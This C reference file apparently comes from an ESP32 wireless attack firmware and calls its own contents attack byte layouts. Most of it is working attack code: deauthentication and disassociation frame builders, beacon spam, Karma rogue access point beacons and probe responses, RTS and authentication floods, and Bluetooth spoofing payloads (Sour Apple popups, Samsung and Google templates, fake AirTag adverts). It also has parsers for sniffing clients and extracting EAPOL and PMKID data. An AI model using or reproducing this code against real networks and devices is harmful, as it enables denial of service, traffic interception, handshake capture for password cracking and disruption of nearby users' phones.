/*
 * functions.cpp — REFERENCE ONLY
 * -----------------------------------------------------------------------------
 * STRICTLY frame creation + frame parsing logic extracted from ESP32-TYPHON.
 * Not compiled into the PlatformIO project. Use for study / porting.
 *
 * Sources: TYPHON ui.cpp, Nightshade-style client sniff, RapierXbox Sour-Apple,
 *          nyanBOX AirTag detect/spoof patterns, Espressif 802.11 management layout.
 *
 * Legend:
 *   BUILD  = construct TX frame bytes
 *   PARSE  = interpret RX frame bytes
 * -----------------------------------------------------------------------------
 */

#include <stdint.h>
#include <string.h>
#include <stdbool.h>

/* Optional: if compiling standalone for tests
#include <esp_timer.h>
#include <esp_random.h>
*/

// =============================================================================
//  802.11 helpers
// =============================================================================

/** PARSE: compare two 6-byte MACs (IRAM-safe style). */
static inline bool frame_mac_equal(const uint8_t* a, const uint8_t* b) {
  for (int i = 0; i < 6; i++) if (a[i] != b[i]) return false;
  return true;
}

/** PARSE: frame control subtype nibble (mgmt: 0xC0 deauth, 0xA0 disassoc, …). */
static inline uint8_t frame_mgmt_subtype(const uint8_t* fc) {
  return (uint8_t)(fc[0] & 0xF0);
}

/** PARSE: frame type bits (0=mgmt, 1=ctrl, 2=data). */
static inline uint8_t frame_type(const uint8_t* fc) {
  return (uint8_t)((fc[0] & 0x0C) >> 2);
}

// =============================================================================
//  DEAUTH / DISASSOC — BUILD
// =============================================================================

/**
 * BUILD: 802.11 Deauthentication (0xC0) or Disassociation (0xA0).
 * Layout (26–28 bytes used):
 *   FC | Duration | DA | SA(=BSSID) | BSSID | Seq | Reason
 */
static void frame_build_deauth(uint8_t* out, const uint8_t* dest,
                               const uint8_t* bssid, bool disassoc,
                               uint16_t reason /* default 1 */) {
  memset(out, 0, 28);
  out[0] = disassoc ? 0xA0 : 0xC0;
  out[1] = 0x00;
  out[2] = 0x3A; out[3] = 0x01;          /* duration */
  memcpy(out + 4,  dest,  6);            /* DA */
  memcpy(out + 10, bssid, 6);            /* SA */
  memcpy(out + 16, bssid, 6);            /* BSSID */
  out[24] = (uint8_t)(reason & 0xFF);
  out[25] = (uint8_t)((reason >> 8) & 0xFF);
}

// =============================================================================
//  BEACON — BUILD
// =============================================================================

/**
 * BUILD: Beacon frame with SSID, rates, DS channel, optional RSN (WPA2 look).
 * Returns length written into @frame.
 * @beacon_mac is source + BSSID (6 bytes).
 */
static int frame_build_beacon(uint8_t* frame, const char* ssid, uint8_t channel,
                              bool wpa2, const uint8_t* beacon_mac,
                              uint64_t timestamp_us) {
  static const uint8_t rsn[] = {
    0x30, 0x18, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x02, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x00, 0x0F,
    0xAC, 0x02, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00
  };

  uint8_t* p = frame;
  *p++ = 0x80; *p++ = 0x00;                 /* Beacon */
  *p++ = 0x00; *p++ = 0x00;                 /* Duration */
  memset(p, 0xFF, 6); p += 6;               /* DA = broadcast */
  memcpy(p, beacon_mac, 6); p += 6;         /* SA */
  memcpy(p, beacon_mac, 6); p += 6;         /* BSSID */
  /* Seq: caller may randomize; leave 0 here or pass in */
  *p++ = 0x00; *p++ = 0x00;

  memcpy(p, &timestamp_us, 8); p += 8;      /* Timestamp */
  *p++ = 0x64; *p++ = 0x00;                 /* Beacon interval 100 TU */
  *p++ = wpa2 ? 0x11 : 0x01;                /* Cap: ESS (+privacy) */
  *p++ = 0x04;

  uint8_t ssidLen = 0;
  while (ssid[ssidLen] && ssidLen < 32) ssidLen++;
  *p++ = 0x00; *p++ = ssidLen;              /* SSID IE */
  memcpy(p, ssid, ssidLen); p += ssidLen;

  *p++ = 0x01; *p++ = 0x08;                 /* Supported Rates */
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;

  *p++ = 0x03; *p++ = 0x01; *p++ = channel; /* DS Parameter Set */

  if (wpa2) {
    memcpy(p, rsn, sizeof(rsn));
    p += sizeof(rsn);
  }
  return (int)(p - frame);
}

// =============================================================================
//  PROBE REQUEST — BUILD
// =============================================================================

/**
 * BUILD: Directed Probe Request toward AP BSSID.
 * @probe_mac = fake STA source address.
 * Returns length (uses caller buffer @out, recommend ≥ 64 bytes).
 */
static int frame_build_probe_req(uint8_t* out, const char* ssid,
                                 const uint8_t* bssid, const uint8_t* probe_mac,
                                 uint8_t ch) {
  memset(out, 0, 64);
  uint8_t* p = out;
  *p++ = 0x40; *p++ = 0x00;                 /* Probe Request */
  *p++ = 0x00; *p++ = 0x00;
  memcpy(p, bssid, 6); p += 6;              /* DA = AP */
  memcpy(p, probe_mac, 6); p += 6;          /* SA = STA */
  memcpy(p, bssid, 6); p += 6;              /* BSSID */
  *p++ = 0x00; *p++ = 0x00;                 /* Seq */

  uint8_t sl = 0;
  if (ssid) while (ssid[sl] && sl < 32) sl++;
  *p++ = 0x00; *p++ = sl;
  if (sl) { memcpy(p, ssid, sl); p += sl; }

  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;
  *p++ = 0x03; *p++ = 0x01; *p++ = ch;
  return (int)(p - out);
}

// =============================================================================
//  KARMA — BUILD (beacon + probe response) + PARSE (probe req SSID)
// =============================================================================

/**
 * BUILD: Karma / rogue AP beacon (open or privacy bit tweaked by caller).
 */
static int frame_build_karma_beacon(uint8_t* frame, const char* ssid,
                                    const uint8_t* bssid, uint8_t ch) {
  memset(frame, 0, 128);
  frame[0] = 0x80; frame[1] = 0x00;
  memset(frame + 4, 0xFF, 6);
  memcpy(frame + 10, bssid, 6);
  memcpy(frame + 16, bssid, 6);
  frame[24] = 0x00; frame[25] = 0x00;
  frame[26] = 0x64; frame[27] = 0x00;
  frame[28] = 0x01; frame[29] = 0x04;       /* ESS, open-looking */
  int p = 36;
  uint8_t sl = 0;
  while (ssid[sl] && sl < 32) sl++;
  frame[p++] = 0x00; frame[p++] = sl;
  memcpy(frame + p, ssid, sl); p += sl;
  frame[p++] = 0x01; frame[p++] = 0x08;
  frame[p++] = 0x82; frame[p++] = 0x84; frame[p++] = 0x8b; frame[p++] = 0x96;
  frame[p++] = 0x0c; frame[p++] = 0x12; frame[p++] = 0x18; frame[p++] = 0x24;
  frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = ch;
  return p;
}

/**
 * BUILD: Probe Response for Karma (answers client probe with chosen SSID).
 */
static int frame_build_karma_probe_resp(uint8_t* frame, const char* ssid,
                                        const uint8_t* bssid, const uint8_t* dest,
                                        uint8_t ch, uint64_t timestamp_us) {
  memset(frame, 0, 128);
  uint8_t* p = frame;
  *p++ = 0x50; *p++ = 0x00;                 /* Probe Response */
  *p++ = 0x00; *p++ = 0x00;
  memcpy(p, dest, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  memcpy(p, &timestamp_us, 8); p += 8;
  *p++ = 0x64; *p++ = 0x00;
  *p++ = 0x01; *p++ = 0x04;
  uint8_t sl = 0;
  while (ssid[sl] && sl < 32) sl++;
  *p++ = 0x00; *p++ = sl;
  if (sl) { memcpy(p, ssid, sl); p += sl; }
  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;
  *p++ = 0x03; *p++ = 0x01; *p++ = ch;
  return (int)(p - frame);
}

/**
 * PARSE: Probe Request → extract SSID IE (element id 0 at offset 24).
 * Writes NUL-terminated SSID into @out_ssid (max 32 chars + NUL).
 * Returns SSID length, or 0 if not a probe req / empty.
 */
static int frame_parse_probe_req_ssid(const uint8_t* f, int sig_len,
                                      char* out_ssid, int out_max) {
  if (!f || sig_len < 28 || !out_ssid || out_max < 2) return 0;
  if ((f[0] & 0xFC) != 0x40) return 0;      /* not probe request */
  int off = 24;
  if (f[off] != 0x00) return 0;             /* SSID IE */
  uint8_t sl = f[off + 1];
  if (sl == 0 || sl >= 32 || off + 2 + sl > sig_len) return 0;
  if (sl >= out_max) sl = (uint8_t)(out_max - 1);
  memcpy(out_ssid, f + off + 2, sl);
  out_ssid[sl] = 0;
  return (int)sl;
}

// =============================================================================
//  RTS / AUTH FLOOD — BUILD
// =============================================================================

/**
 * BUILD: RTS control frame (0xB4), 16 bytes used of @out (caller ≥ 32).
 */
static void frame_build_rts(uint8_t* out, const uint8_t* dest, const uint8_t* src) {
  memset(out, 0, 32);
  out[0] = 0xB4; out[1] = 0x00;             /* RTS */
  out[2] = 0xD0; out[3] = 0x02;             /* duration / NAV-ish */
  memcpy(out + 4,  dest, 6);
  memcpy(out + 10, src,  6);
}

/**
 * BUILD: Authentication open-system seq 1 (0xB0).
 */
static void frame_build_auth(uint8_t* out, const uint8_t* ap, const uint8_t* sta) {
  memset(out, 0, 32);
  out[0] = 0xB0; out[1] = 0x00;             /* Auth */
  memcpy(out + 4,  ap,  6);
  memcpy(out + 10, sta, 6);
  memcpy(out + 16, ap,  6);
  out[24] = 0x00; out[25] = 0x00;           /* open system */
  out[26] = 0x01; out[27] = 0x00;           /* seq 1 */
  out[28] = 0x00; out[29] = 0x00;           /* status success */
}

/* CTS is typically hardware-generated; flood mode may reuse RTS body patterns. */

// =============================================================================
//  PACKET MONITOR — PARSE (classify)
// =============================================================================

/**
 * PARSE: Classify promiscuous packet type for monitor counters.
 * Sets *is_deauth_or_disassoc if mgmt subtype is deauth/disassoc.
 */
static void frame_parse_pm_classify(const uint8_t* payload, int sig_len,
                                    int pkt_type /* WIFI_PKT_* style: 0 mgmt 1 ctrl 2 data */,
                                    bool* is_deauth_or_disassoc) {
  if (is_deauth_or_disassoc) *is_deauth_or_disassoc = false;
  if (!payload || sig_len < 1) return;
  if (pkt_type == 0 /* MGMT */) {
    uint8_t fc0 = payload[0];
    if (fc0 == 0xC0 || fc0 == 0xA0) {
      if (is_deauth_or_disassoc) *is_deauth_or_disassoc = true;
    }
  }
}

// =============================================================================
//  DEAUTH DETECTOR — PARSE
// =============================================================================

/**
 * PARSE: Detect deauth (0xC0) / disassoc (0xA0); copy transmitter (addr2).
 */
static bool frame_parse_deauth_detect(const uint8_t* payload, int sig_len,
                                      uint8_t out_src_mac[6]) {
  if (!payload || sig_len < 24) return false;
  uint8_t subtype = (uint8_t)(payload[0] & 0xF0);
  if (subtype != 0xC0 && subtype != 0xA0) return false;
  if (out_src_mac) memcpy(out_src_mac, payload + 10, 6); /* addr2 */
  return true;
}

// =============================================================================
//  CLIENT SNIFFER — PARSE (Nightshade-style)
// =============================================================================

/**
 * PARSE: From data/mgmt frames on a locked AP BSSID, extract client MAC.
 * @out_client set when a client (non-BSSID) address is found.
 * Returns true if a client MAC was written.
 *
 * Data:
 *   ToDS=1 FromDS=0 → client = addr2 (SA), AP = addr1
 *   ToDS=0 FromDS=1 → client = addr1 (DA), AP = addr2
 * Mgmt (assoc/reassoc/auth/disassoc/deauth/action) with BSSID in addr3:
 *   client = addr2 if not equal to BSSID
 */
static bool frame_parse_client_from_ap(const uint8_t* p, int sig_len,
                                       const uint8_t* ap_bssid,
                                       uint8_t out_client[6]) {
  if (!p || sig_len < 24 || !ap_bssid || !out_client) return false;

  uint16_t fc = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
  uint8_t ft = (uint8_t)((fc & 0x000C) >> 2);
  uint8_t subtype = (uint8_t)((fc & 0x00F0) >> 4);

  if (ft == 0x02) { /* Data */
    bool toDS = (fc >> 8) & 1;
    bool fromDS = (fc >> 9) & 1;
    if (toDS && !fromDS && frame_mac_equal(&p[4], ap_bssid)) {
      memcpy(out_client, &p[10], 6);
      return true;
    }
    if (!toDS && fromDS && frame_mac_equal(&p[10], ap_bssid)) {
      memcpy(out_client, &p[4], 6);
      return true;
    }
  } else if (ft == 0x00 && frame_mac_equal(&p[16], ap_bssid)) {
    /* assoc 0, reassoc 2, disassoc 10, auth 11, deauth 12, action 13 */
    if (subtype == 0x00 || subtype == 0x02 || subtype == 0x0B ||
        subtype == 0x05 || subtype == 0x0A || subtype == 0x0C) {
      if (!frame_mac_equal(&p[10], ap_bssid)) {
        memcpy(out_client, &p[10], 6);
        return true;
      }
    }
  }
  return false;
}

// =============================================================================
//  EAPOL / PMKID — PARSE
// =============================================================================

/**
 * PARSE: Locate EAPOL ethertype 0x888E in 802.11 frame body region.
 * Returns byte offset of 0x88, or -1.
 */
static int frame_parse_eapol_offset(const uint8_t* f, int len) {
  if (!f || len < 36) return -1;
  for (int i = 24; i + 2 < len && i < 48; i++)
    if (f[i] == 0x88 && f[i + 1] == 0x8E) return i;
  for (int i = 24; i + 2 < len; i++)
    if (f[i] == 0x88 && f[i + 1] == 0x8E) return i;
  return -1;
}

/**
 * PARSE: Map addr1/2/3 + ToDS/FromDS → BSSID and STA.
 */
static void frame_parse_bssid_sta(const uint8_t* f,
                                  const uint8_t** bssid, const uint8_t** sta) {
  const uint8_t *a1 = f + 4, *a2 = f + 10, *a3 = f + 16;
  uint8_t tods = f[1] & 0x01, fromds = f[1] & 0x02;
  if (tods && !fromds) { *bssid = a1; *sta = a2; }
  else if (!tods && fromds) { *bssid = a2; *sta = a1; }
  else { *bssid = a3; *sta = a2; }
}

/**
 * PARSE: Crude PMKID-ish 16-byte non-zero run after EAPOL header (heuristic).
 */
static bool frame_parse_pmkid_heuristic(const uint8_t* f, int len, int eapol_off,
                                        uint8_t out_pmkid[16]) {
  if (!f || !out_pmkid || eapol_off < 0) return false;
  for (int i = eapol_off + 2; i + 16 < len; i++) {
    if (f[i] == 0 && f[i + 1] == 0) continue;
    int nz = 0;
    for (int k = 0; k < 16; k++) if (f[i + k]) nz++;
    if (nz >= 12) {
      memcpy(out_pmkid, f + i, 16);
      return true;
    }
  }
  return false;
}

// =============================================================================
//  BLE AD STRUCTURE — PARSE
// =============================================================================

/**
 * PARSE: Walk BLE AD structures [len][type][data…].
 * Calls visitor(type, data, data_len, user) for each; stop if visitor returns false.
 */
typedef bool (*frame_ble_ad_visitor_t)(uint8_t type, const uint8_t* data,
                                       uint8_t data_len, void* user);

static void frame_parse_ble_ad_walk(const uint8_t* payload, uint8_t plen,
                                    frame_ble_ad_visitor_t visit, void* user) {
  if (!payload || !visit) return;
  uint8_t i = 0;
  while (i < plen) {
    uint8_t adlen = payload[i];
    if (adlen == 0) break;
    if ((uint16_t)i + 1 + adlen > plen) break;
    uint8_t typ = payload[i + 1];
    if (!visit(typ, payload + i + 2, (uint8_t)(adlen - 1), user)) break;
    i = (uint8_t)(i + adlen + 1);
  }
}

/**
 * PARSE: nyanBOX-compatible AirTag / Find My Offline Finding marker.
 * True if payload contains 1E FF 4C 00… or 4C 00 12 19.
 */
static bool frame_parse_is_airtag_payload(const uint8_t* payload, uint8_t len) {
  if (!payload || len < 4) return false;
  for (int i = 0; i <= (int)len - 4; i++) {
    if (payload[i] == 0x1E && payload[i + 1] == 0xFF &&
        payload[i + 2] == 0x4C && payload[i + 3] == 0x00)
      return true;
    if (payload[i] == 0x4C && payload[i + 1] == 0x00 &&
        payload[i + 2] == 0x12 && payload[i + 3] == 0x19)
      return true;
  }
  return false;
}

/**
 * PARSE: Manufacturer data Apple (company 0x004C) Offline Finding type 0x12.
 * Used when AD walk finds type 0xFF.
 */
static bool frame_parse_apple_of_in_mfg(const uint8_t* mfg, uint8_t mfg_len) {
  if (!mfg || mfg_len < 3) return false;
  if (mfg[0] == 0x4C && mfg[1] == 0x00 && mfg[2] == 0x12) return true;
  return false;
}

/**
 * BUILD: Rebuild AD-framed manufacturer blob from raw mfg bytes (max 29).
 * out[0]=len, out[1]=0xFF, out[2…]=mfg. Returns total length.
 */
static uint8_t frame_build_mfg_ad(uint8_t* out, const uint8_t* mfg, uint8_t mfg_len) {
  if (!out || !mfg || mfg_len == 0) return 0;
  if (mfg_len > 29) mfg_len = 29;
  out[0] = (uint8_t)(mfg_len + 1);
  out[1] = 0xFF;
  memcpy(out + 2, mfg, mfg_len);
  return (uint8_t)(mfg_len + 2);
}

// =============================================================================
//  SOUR APPLE (Continuity) — BUILD
// =============================================================================

/** Continuity “Nearby Action” types (RapierXbox / TYPHON list, no Random Mix). */
static const uint8_t FRAME_SOUR_ACTION_TYPES[] = {
  0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
};
static const int FRAME_SOUR_ACTION_N =
  (int)(sizeof(FRAME_SOUR_ACTION_TYPES) / sizeof(FRAME_SOUR_ACTION_TYPES[0]));

/**
 * BUILD: Exact 17-byte Continuity manufacturer AD (Sour Apple).
 * @typeIdx indexes FRAME_SOUR_ACTION_TYPES; out of range → first entry.
 * @rand3 / @rand3b: 3+3 random bytes for auth tag / trailing entropy.
 */
static void frame_build_sour_apple(uint8_t* packet, uint8_t* plen, int typeIdx,
                                   const uint8_t rand3[3], const uint8_t rand3b[3]) {
  uint8_t i = 0;
  packet[i++] = 16;       /* AD length of following */
  packet[i++] = 0xFF;     /* Manufacturer Specific */
  packet[i++] = 0x4C;     /* Apple company ID LE */
  packet[i++] = 0x00;
  packet[i++] = 0x0F;     /* Continuity */
  packet[i++] = 0x05;
  packet[i++] = 0xC1;     /* action flags */
  uint8_t at = FRAME_SOUR_ACTION_TYPES[0];
  if (typeIdx >= 0 && typeIdx < FRAME_SOUR_ACTION_N)
    at = FRAME_SOUR_ACTION_TYPES[typeIdx];
  packet[i++] = at;
  packet[i++] = rand3[0];
  packet[i++] = rand3[1];
  packet[i++] = rand3[2];
  packet[i++] = 0x00;
  packet[i++] = 0x00;
  packet[i++] = 0x10;
  packet[i++] = rand3b[0];
  packet[i++] = rand3b[1];
  packet[i++] = rand3b[2];
  *plen = i; /* 17 */
}

// =============================================================================
//  BLE SPOOF TEMPLATES — BUILD
// =============================================================================

/** Samsung EasySetup-style manufacturer template (15 bytes AD). */
static const uint8_t FRAME_SAMSUNG_ADV_TEMPLATE[15] = {
  14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
};

/** Google Fast Pair-ish template (14 bytes). */
static const uint8_t FRAME_GOOGLE_ADV_TEMPLATE[14] = {
  0x03, 0x03, 0x2C, 0xFE,
  0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27,
  0x02, 0x0A, 0x00
};

/**
 * BUILD: Apple Continuity-ish 31-byte template variants (device type in byte 7).
 * @variant 0..3 maps to common nearby-action device ids used in TYPHON.
 */
static void frame_build_apple_spoof_template(uint8_t out[31], int variant,
                                             uint8_t rnd_a, uint8_t rnd_b, uint8_t rnd_c) {
  static const uint8_t base[][31] = {
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  };
  if (variant < 0) variant = 0;
  if (variant > 3) variant = 3;
  memcpy(out, base[variant], 31);
  out[17] = rnd_a;
  out[18] = rnd_b;
  out[19] = rnd_c;
}

/**
 * BUILD: Samsung ADV from template; model byte at index 14.
 */
static void frame_build_samsung_spoof(uint8_t out[15], uint8_t model) {
  memcpy(out, FRAME_SAMSUNG_ADV_TEMPLATE, 15);
  out[14] = model;
}

/**
 * BUILD: Google ADV from template; entropy at index 13.
 */
static void frame_build_google_spoof(uint8_t out[14], uint8_t entropy) {
  memcpy(out, FRAME_GOOGLE_ADV_TEMPLATE, 14);
  out[13] = entropy;
}

/**
 * BUILD: Flags (0x01) + Complete Local Name (0x09) AD structure.
 * Returns total length (max name 26 → ≤ 31).
 */
static uint8_t frame_build_name_adv(uint8_t* out, const char* name) {
  size_t nl = 0;
  while (name && name[nl] && nl < 26) nl++;
  out[0] = 0x02; out[1] = 0x01; out[2] = 0x06;           /* Flags LE General */
  out[3] = (uint8_t)(nl + 1); out[4] = 0x09;             /* Complete Local Name */
  memcpy(out + 5, name, nl);
  return (uint8_t)(5 + nl);
}

/**
 * BUILD: Synthetic AirTag Offline Finding 31-byte ADV (when no capture exists).
 * Not a valid Find My key — structure only.
 */
static void frame_build_synthetic_airtag(uint8_t out[31], const uint8_t rnd[25]) {
  out[0] = 0x1E; out[1] = 0xFF; out[2] = 0x4C; out[3] = 0x00;
  out[4] = 0x12; out[5] = 0x19;
  for (int i = 0; i < 25; i++) out[6 + i] = rnd[i];
}

/**
 * BUILD: Force static-random MAC top bits (BT Core Spec).
 */
static void frame_ble_force_static_random(uint8_t mac[6]) {
  if (!mac) return;
  mac[0] = (uint8_t)((mac[0] & 0x3F) | 0xC0);
}

// =============================================================================
//  MAC string — PARSE (utility for AirTag clone addr)
// =============================================================================

/**
 * PARSE: "AA:BB:CC:DD:EE:FF" → 6 bytes. Returns false on failure.
 */
static bool frame_parse_mac_str(const char* s, uint8_t out[6]) {
  if (!s || !out) return false;
  unsigned int b[6];
  int n = 0;
  /* Minimal parser without sscanf dependency for reference clarity */
  for (int i = 0; i < 6; i++) {
    unsigned v = 0;
    for (int nibble = 0; nibble < 2; nibble++) {
      char c = *s++;
      if (c >= '0' && c <= '9') v = (v << 4) | (unsigned)(c - '0');
      else if (c >= 'a' && c <= 'f') v = (v << 4) | (unsigned)(c - 'a' + 10);
      else if (c >= 'A' && c <= 'F') v = (v << 4) | (unsigned)(c - 'A' + 10);
      else return false;
    }
    b[i] = v;
    if (i < 5) {
      if (*s != ':' && *s != '-') return false;
      s++;
    }
    n++;
  }
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
  return n == 6;
}

/*
 * END OF REFERENCE FILE
 * All attack TX/RX *byte layouts* live above. Runtime (radio, UI, loops) stays in ui.cpp.
 */
